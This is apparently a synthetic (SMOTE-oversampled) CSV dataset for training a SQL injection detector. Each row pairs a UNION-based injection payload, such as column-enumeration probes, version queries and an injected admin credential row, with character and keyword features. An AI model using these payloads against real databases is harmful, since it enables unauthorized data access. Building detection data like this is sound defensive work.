id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000746,attack,union,"1234 ' AND 1  =  0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",nearest_attack_euclidean,R000021,0.8576095740396994,76.7631258510056,31.238846677541904,4.490594622982396,34.2388466775419,24.52427917346369,11.904855834692738,6.0951441653072616,0.44554647654104,0.3192930235217018,0.15530991023549634,0.0798505897017619,3.7145675040782136,0.0,0.09514416530726244,0.0,0.0,0.9048558346927379,3.469446951953614e-18,0.095144165307262,0.0,3.469446951953614e-18,1.190288330614524,1.0,1.0,0.0,0.0,0.09514416530726211,0.0,0.9048558346927379,0.09514416530726211,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.0,5.551115123125783e-17,0.9048558346927379,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.9048558346927376
SMOTE_000747,attack,union,"-3593%' union all select 6346,6346,6346,6346,6346,6346--",nearest_attack_euclidean,R000030,0.5365477778257262,59.94604859422336,20.0,3.6901633785534522,14.0,31.15683887537869,4.0,10.789209718844672,0.23505284623400244,0.5179365845191971,0.06715795606685783,0.17985261317994267,1.0,0.0,3.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,3.469446951953614e-18,5.789209718844672,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000748,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R000058,0.3549975939355222,58.1477774803802,22.57744851561188,4.010569384592879,25.626707675738615,15.154897031223761,10.683086386708911,6.6830863867089105,0.43936315151870303,0.25944275757886515,0.18613438635731022,0.1150597045451216,0.8943621289029703,0.0,3.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,3.469446951953614e-18,1.7887242578059406,3.0,0.8943621289029703,0.0,1.0,0.0,0.0,0.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000749,attack,union," select * from users where id  =  1 or 1#""? union select version  (    )  ,version  (    )   -- 1",nearest_attack_euclidean,R000012,3.3615795776167596,103.94396163598192,27.462930775732126,3.8657255036409093,56.86982318744617,3.4629307757321257,32.537069224267874,11.074138448535745,0.5441015030393193,0.03314363036985185,0.3149802080970711,0.10777465849375777,0.0,0.5370692242678725,2.0,0.0,1.0,1.4629307757321275,3.469446951953614e-18,3.074138448535745,0.0,3.469446951953614e-18,1.0,4.925861551464255,0.0,0.5370692242678725,1.0,0.5370692242678724,0.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,2.0,1.0,1.4629307757321275,1.4629307757321275,3.469446951953614e-18,0.5370692242678725,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.4629307757321275
SMOTE_000750,attack,union,"-4452%"" union all select 7141,7141,7141,7141,7141,7141,7141,7141--",nearest_attack_euclidean,R000063,0.3657039449568984,64.37128582642879,20.16287141735712,3.6556004098755093,14.0,34.69702866114303,4.0,11.674257165285757,0.21829058399080006,0.5380512992110399,0.062368738283085715,0.1812893785150743,0.0,1.0,3.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,3.469446951953614e-18,6.674257165285757,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000751,attack,union,"-4452%"" union all select 7141,7141,7141,7141,7141,7141,7141,7141--",nearest_attack_euclidean,R000063,0.2613020348782223,64.83625447945508,20.11637455205449,3.635183445204436,14.0,35.06900358356406,4.0,11.767250895891015,0.2165293390929732,0.5401647930884321,0.0618655254551352,0.18144034236345943,0.0,1.0,3.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,3.469446951953614e-18,6.767250895891015,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000752,attack,union,"-2899""   )    )    as uyoc where 8417  =  8417 union all select 8417,8417,8417,8417--",nearest_attack_euclidean,R000057,2.730948048661132,89.132790639051,26.344399219920916,3.9385429716244427,33.26558127810198,19.3900195019771,25.788391419130072,10.688798439841833,0.36679862251817996,0.2266141321739995,0.2868516527067234,0.11973559260109712,0.0,1.0,2.655600780079084,0.0,0.34439921992091604,1.0,3.469446951953614e-18,2.6887984398418316,0.0,3.469446951953614e-18,2.3112015601581684,4.0,0.0,1.0,1.0,0.34439921992091593,0.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,1.344399219920916,1.0,1.0,0.3443992199209159,3.469446951953614e-18,0.34439921992091593,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.033197659762748
SMOTE_000753,attack,union,"-6020'+  (  select isrz where 2489  =  2489 union all select 2489,2489,2489,2489,2489,2489,2489,2489--",nearest_attack_euclidean,R000074,1.1027065277646853,100.08266619569883,27.0,4.0679233407036985,27.082666195698838,44.0,15.479333451075291,13.520666548924709,0.27031158786374704,0.4398121936163717,0.1548271327605239,0.13504908575935742,1.0,0.0,3.0,0.0,0.0,1.0,3.469446951953614e-18,1.0,0.0,3.469446951953614e-18,7.0,4.5206665489247095,1.0,0.0,1.0,0.0,0.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,1.5206665489247095,1.0,1.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.5206665489247095
SMOTE_000754,attack,union,"-4452%"" union all select 7141,7141,7141,7141,7141,7141,7141,7141--",nearest_attack_euclidean,R000063,0.6907493251422648,64.54518112929371,20.14548188707063,3.7401877801812855,14.0,34.83614490343497,4.0,11.70903622585874,0.22189085154837596,0.5337309781419488,0.06339738615667885,0.18098078415299634,0.0,1.0,3.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,3.469446951953614e-18,6.709036225858742,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000755,attack,union,"-6186' in boolean mode  )   union all select 2990,2990,2990#",nearest_attack_euclidean,R000066,2.1471676992320043,68.10445260853776,25.910432374484778,4.16827205174785,28.910432374484778,21.194020234052985,11.238804046810596,6.761195953189403,0.423344750278302,0.3107538980360333,0.1655568608182985,0.10034449086736624,1.7164121404317911,0.0,0.7611959531894028,0.0,0.0,0.23880404681059708,3.469446951953614e-18,0.7611959531894029,0.0,3.469446951953614e-18,2.5223919063788056,1.0,1.0,0.0,0.0,0.7611959531894029,0.0,0.23880404681059703,0.7611959531894029,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.0,5.551115123125783e-17,0.23880404681059697,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.238804046810597
SMOTE_000756,attack,union,"-6789'||  (  select 'uckz' from dual where 2163  =  2163 union all select 2163,2163,2163,2163,2163,2163--",nearest_attack_euclidean,R000032,0.9013907631123751,99.19156720551419,30.451084588137117,4.348691703506548,33.902169176274235,34.45108458813712,16.22554229406856,14.61277114703428,0.34070262189468464,0.34777433464083457,0.16374870882364628,0.14777433464083453,3.0,0.0,3.0,0.0,0.0,1.0,3.469446951953614e-18,1.0,0.0,3.469446951953614e-18,4.612771147034279,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,1.0,2.0,1.0,1.0,0.6127711470342797,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.612771147034279
SMOTE_000757,attack,union,"-9145'  )   as xyya where 8950  =  8950 union all select 8950,8950,8950,8950,8950,8950,8950,8950--",nearest_attack_euclidean,R000033,0.19017627214126295,98.33066948110991,27.0,4.02605829010011,25.330669481109908,44.0,15.917332629722523,13.082667370277477,0.2575168939696902,0.4475240639086799,0.16192555882503487,0.13303348329659503,1.0,0.0,3.0,0.0,0.0,1.0,3.469446951953614e-18,1.0,0.0,3.469446951953614e-18,7.0,4.082667370277476,1.0,0.0,1.0,0.0,0.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,1.0826673702774765,1.0,1.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0826673702774765
SMOTE_000758,attack,union,"-3226'||  (  select 'ykdw' where 2617  =  2617 union all select 2617,2617--",nearest_attack_euclidean,R000077,0.15176141913800195,76.08781060063602,28.0,4.281112965536143,29.0,20.870248480508817,15.0,11.217562120127203,0.38140891543025923,0.27391873733757344,0.19728047349840996,0.14739187373375734,3.0,0.0,3.0,0.0,0.0,1.0,3.469446951953614e-18,1.0,0.0,3.469446951953614e-18,1.2175621201272038,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,1.0,2.0,1.0,1.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000759,attack,union,"-4465%' union all select 6196,6196,6196,6196,6196,6196,6196,6196--",nearest_attack_euclidean,R000035,0.5469639105723575,61.97734580291921,20.0,3.6633772179628554,14.0,32.78187664233537,4.0,11.195469160583842,0.22735853862530603,0.5271697536496327,0.06495958246437314,0.18051212526068805,1.0,0.0,3.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,3.469446951953614e-18,6.1954691605838415,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000760,attack,union,"-3017""   )    )    as ljit where 9128  =  9128 union all select 9128,9128,9128,9128,9128--",nearest_attack_euclidean,R000052,0.016399752342781466,89.8853160284506,26.977063205690122,4.027203076067046,25.0,31.90825282276049,22.0,10.977063205690122,0.27815256199852745,0.3549559008023561,0.2447742545587041,0.12211728264041231,0.0,1.0,3.0,0.0,0.0,1.0,3.469446951953614e-18,2.0,0.0,3.469446951953614e-18,3.9770632056901216,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,1.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000761,attack,union,"-7963'+  (  select 'kxzh' where 7039  =  7039 union all select 7039,7039,7039,7039,7039,7039--",nearest_attack_euclidean,R000078,0.008792015358411693,93.93385237010607,27.993385237010607,4.183747081619884,29.0,35.94708189608485,15.0,13.986770474021213,0.3087535817207351,0.3826503309154202,0.15970012847624226,0.14889595888760246,3.0,0.0,3.0,0.0,0.0,1.0,3.469446951953614e-18,1.0,0.0,3.469446951953614e-18,4.986770474021214,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,2.0,1.0,1.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000762,attack,union,"-3667%'   )    )    union all select 3560,3560,3560--",nearest_attack_euclidean,R000053,1.6510643202193644,54.798553137012405,22.510789586002755,3.982711546342231,18.910066154508954,15.02157917200551,12.866907810497933,8.0,0.33601749731636876,0.27002940739018805,0.24445449210408057,0.14949860318936262,1.0,0.0,3.0,0.0,0.0,0.0,3.469446951953614e-18,1.6223026034993113,0.6223026034993112,3.469446951953614e-18,1.7553947930013778,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000763,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R000034,2.0728703728518263,64.80205806237093,22.026265918467036,3.9249170705367957,20.67072847003574,22.157595510802224,12.460601122299444,9.513132959233518,0.3109036236441662,0.3360277142687644,0.20287563222658328,0.1501930298604861,1.0,0.0,3.0,0.0,0.0,0.0,3.469446951953614e-18,1.4868670407664812,0.48686704076648124,3.469446951953614e-18,3.5393988777005565,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000764,attack,union,"-4955%' union all select 5928,5928--",nearest_attack_euclidean,R000051,0.8179450513734635,41.08824076149149,20.0,4.014203397923662,14.0,16.070592609193195,4.0,7.017648152298299,0.3535538836007535,0.3757353396790958,0.10101539531450099,0.1696953814056497,1.0,0.0,3.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,3.469446951953614e-18,2.0176481522982987,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000765,attack,union,"-3370' in boolean mode  )   union all select 3432,3432,3432,3432#",nearest_attack_euclidean,R000060,2.0957096142988956,65.40469674143581,24.40469674143581,4.137864279968402,27.0,20.0,11.0,7.404696741435812,0.41283757295599843,0.30580560959703584,0.1681930852783697,0.11316373216859606,1.0,0.0,1.8093934828716232,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,3.469446951953614e-18,3.0,1.8093934828716232,1.0,0.0,0.40469674143581164,0.5953032585641885,0.0,0.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000766,attack,union," select * from users where id  =  '1' ||1 union select 1,banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000009,2.1471039055710537,106.44776403002787,27.38308489222532,4.065430875880909,63.53233956890128,4.616915107774677,27.06467913780255,11.233830215549363,0.5970934124250262,0.0436289386226294,0.2532000359286576,0.1060776130236867,1.8507453233240434,0.0,2.0,0.0,1.0,2.0,3.469446951953614e-18,0.7661697844506379,0.0,3.469446951953614e-18,1.0,6.61691510777468,0.6169151077746811,0.0,1.0,0.0,0.0,1.0,0.38308489222531894,3.469446951953614e-18,0.0,0.0,0.6169151077746811,2.0,1.0,1.9999999999999998,2.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000767,attack,union,"-4955%' union all select 5928,5928--",nearest_attack_euclidean,R000051,0.2827046780822216,37.85569645248027,20.0,4.087479466951031,14.0,13.484557161984213,4.0,6.371139290496053,0.3747386980747692,0.35031356231027694,0.10706819944993405,0.16787954016501977,1.0,0.0,3.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,3.469446951953614e-18,1.3711392904960533,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000768,attack,union,"-7111%"" union all select 6083,6083,6083,6083,6083,6083--",nearest_attack_euclidean,R000037,0.34723174950146446,58.05959984435258,21.0,3.968200702806985,14.0,29.647679875482062,4.0,10.411919968870516,0.24155901703134192,0.5101291795623897,0.06901686200895481,0.17929494139731356,0.0,1.0,3.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,3.469446951953614e-18,5.4119199688705155,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000769,attack,union,"-3017""   )    )    as ljit where 9128  =  9128 union all select 9128,9128,9128,9128,9128--",nearest_attack_euclidean,R000052,0.1458694528595188,88.96858048898088,27.0,4.0198803829643035,25.0,31.174864391184695,22.0,10.793716097796175,0.2815978500408116,0.34944343993470145,0.24780610803591419,0.12115260198857275,0.0,1.0,3.0,0.0,0.0,1.0,3.469446951953614e-18,2.0,0.0,3.469446951953614e-18,3.793716097796174,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,1.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000770,attack,union,"-3009'+  (  select 'gqbo' where 6915  =  6915 union all select 6915,6915--",nearest_attack_euclidean,R000054,1.3351447651215234,74.4872535380926,28.512746461907394,4.300803094521921,29.0,20.0,15.0,10.487253538092604,0.38934588241357015,0.26851440166453117,0.2013858012483984,0.14075391467350032,3.0,0.0,3.0,0.0,0.0,1.0,3.469446951953614e-18,1.0,0.0,3.469446951953614e-18,1.0,5.487253538092605,1.0,0.0,1.0,0.0,0.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,0.48725353809260474,2.0,1.0,1.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000771,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R000069,0.4679007297601159,72.1255616750432,24.183258443327574,4.12404178595269,27.0,24.900449340034566,11.0,9.225112335008642,0.37815372891392324,0.3406132478379007,0.154062630298265,0.1271703929499111,1.0,0.0,3.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,3.469446951953614e-18,4.2251123350086415,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000772,attack,union,"-3017""   )    )    as ljit where 9128  =  9128 union all select 9128,9128,9128,9128,9128--",nearest_attack_euclidean,R000052,0.365164876587934,89.93272782917178,26.0,3.9664868715755985,25.0,31.946182263337427,22.0,10.986545565834357,0.2803004822712275,0.351519228366036,0.2466644243986802,0.12151586496405631,0.0,1.0,3.0,0.0,0.0,1.0,3.469446951953614e-18,2.0,0.0,3.469446951953614e-18,3.986545565834357,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,1.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000773,attack,union,"-2643%"" union all select 7779,7779--",nearest_attack_euclidean,R000048,1.019518241520106,37.5082916033037,20.622927099174078,4.075734294893065,14.0,13.508291603303695,4.0,6.0,0.37422494274565854,0.3584715267217283,0.10692141221304528,0.16038211831956792,0.0,1.0,3.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.6229270991740762,3.469446951953614e-18,1.3770729008259237,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000774,attack,union,"-7485""   )    )    as caob where 4100  =  4100 union all select 4100,4100,4100,4100,4100,4100,4100,4100--",nearest_attack_euclidean,R000029,0.5381211730213059,103.13514720779459,26.169532072018672,3.7942143060050606,25.0,42.64374342385061,22.0,13.49140378394398,0.24281877606941593,0.4129327844337743,0.21368052294108603,0.13056791655572375,0.0,0.8304679279813263,3.0,0.0,0.0,1.0,3.469446951953614e-18,2.0,0.0,3.469446951953614e-18,6.660935855962652,4.0,0.0,0.8304679279813264,1.0,0.0,0.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,1.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000775,attack,union,"-7637"" union all select 8498,8498,8498--",nearest_attack_euclidean,R000059,0.9566414353188338,38.584729350097334,20.353817662475667,4.068373171500911,14.0,14.584729350097332,4.0,6.0,0.3637595757629426,0.3764121558349556,0.10393130736084073,0.1558969610412611,0.0,1.0,3.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.3538176624756665,3.469446951953614e-18,1.6461823375243334,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
